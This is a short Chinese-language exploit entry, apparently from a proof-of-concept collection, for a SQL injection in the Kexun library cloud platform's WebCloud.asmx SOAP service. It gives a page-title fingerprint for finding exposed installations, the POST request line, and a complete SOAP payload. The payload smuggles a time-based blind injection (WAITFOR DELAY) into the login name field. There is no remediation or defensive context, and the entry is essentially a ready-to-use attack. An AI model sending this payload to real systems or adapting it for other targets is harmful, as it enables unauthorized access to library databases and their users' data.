# 科迅图书馆云平台WebCloud.asmxSQL注入

科迅图书馆云平台WebCloud.asmx ｜ SQL注入 ｜ —
- **指纹**：`title==" 欢迎使用 图书馆云平台"`
- **请求**：`POST /WebCloud.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<LibraryCloud xmlns="WebCloud">
<str>{"cmd":"login","schoolloginname":"1';WAITFOR DELAY '0:0:5'--","schoolpwd":"1"}</str>
<files>base64Binary</files>
</LibraryCloud>
</soap:Body>
</soap:Envelope>
```